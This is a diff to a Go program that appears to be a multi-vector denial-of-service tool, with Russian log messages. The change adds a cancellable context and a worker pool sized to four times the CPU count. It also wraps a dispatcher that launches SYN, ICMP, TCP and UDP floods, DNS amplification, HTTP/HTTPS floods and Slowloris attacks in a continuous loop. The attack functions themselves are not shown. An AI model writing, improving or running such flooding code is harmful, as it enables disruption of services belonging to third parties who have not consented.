@@ -20,6 +20,8 @@ import (
 	"sync/atomic"
 	"time"
 	"syscall"
+	"context"
+	"runtime"
 )
 
 // #################### CONFIG ####################
@@ -71,13 +73,21 @@ func main() {
 	go printStats()
 	go proxyHealthChecker()
 
-	// Graceful shutdown
+	// Graceful shutdown + динамический пул воркеров
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	workerCount := threads
+	if threads <= 0 {
+		workerCount = runtime.NumCPU() * 4
+	}
+
 	var wg sync.WaitGroup
-	for i := 0; i < threads; i++ {
+	for i := 0; i < workerCount; i++ {
 		wg.Add(1)
-		go attackWorker(&wg)
+		go attackWorkerCtx(ctx, &wg)
 	}
 
 	select {
@@ -86,6 +96,7 @@ func main() {
 	case <-stop:
 		log.Println("\n🛑 Получен сигнал завершения. Ожидание завершения воркеров...")
 	}
+	cancel()
 	wg.Wait()
 
 	printFinalStats()
@@ -267,32 +278,38 @@ func proxyHealthChecker() {
 }
 
 // #################### UTILS ####################
-func attackWorker(wg *sync.WaitGroup) {
+func attackWorkerCtx(ctx context.Context, wg *sync.WaitGroup) {
 	defer wg.Done()
-
-	switch strings.ToUpper(attackType) {
-	// L3 Attacks
-	case "SYN":
-		synFlood()
-	case "ICMP":
-		icmpFlood()
-	// L4 Attacks
-	case "TCP":
-		tcpFlood()
-	case "UDP":
-		udpFlood()
-	case "DNS":
-		dnsAmplification()
-	// L7 Attacks
-	case "HTTP":
-		httpFlood()
-	case "HTTPS":
-		useHTTPS = true
-		httpFlood()
-	case "SLOWLORIS":
-		slowloris()
-	default:
-		log.Fatalf("❌ Unknown attack type: %s", attackType)
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			switch strings.ToUpper(attackType) {
+			// L3 Attacks
+			case "SYN":
+				synFlood()
+			case "ICMP":
+				icmpFlood()
+			// L4 Attacks
+			case "TCP":
+				tcpFlood()
+			case "UDP":
+				udpFlood()
+			case "DNS":
+				dnsAmplification()
+			// L7 Attacks
+			case "HTTP":
+				httpFlood()
+			case "HTTPS":
+				useHTTPS = true
+				httpFlood()
+			case "SLOWLORIS":
+				slowloris()
+			default:
+				log.Fatalf("❌ Unknown attack type: %s", attackType)
+			}
+		}
 	}
 }
 
